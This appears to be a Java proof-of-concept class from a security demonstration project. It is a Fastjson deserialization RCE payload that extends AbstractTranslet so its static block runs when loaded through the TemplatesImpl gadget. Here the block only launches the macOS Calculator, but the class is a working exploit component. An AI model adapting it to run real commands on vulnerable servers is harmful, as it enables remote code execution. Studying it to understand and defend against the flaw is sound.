/*
 * [业务问题]: Fastjson 反序列化 RCE 利用类。
 * [实现逻辑]: 通过继承 AbstractTranslet 实现 XSLT 模板注入，在静态代码块中执行系统命令。
 */
package com.security.bug.fastjson.rce;

import org.apache.xalan.xsltc.DOM;
import org.apache.xalan.xsltc.TransletException;
import org.apache.xalan.xsltc.runtime.AbstractTranslet;
import org.apache.xml.dtm.DTMAxisIterator;
import org.apache.xml.serializer.SerializationHandler;

/**
 * Fastjson 反序列化利用 class
 */
public class Cmd extends AbstractTranslet {

    static {
        try {
            Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
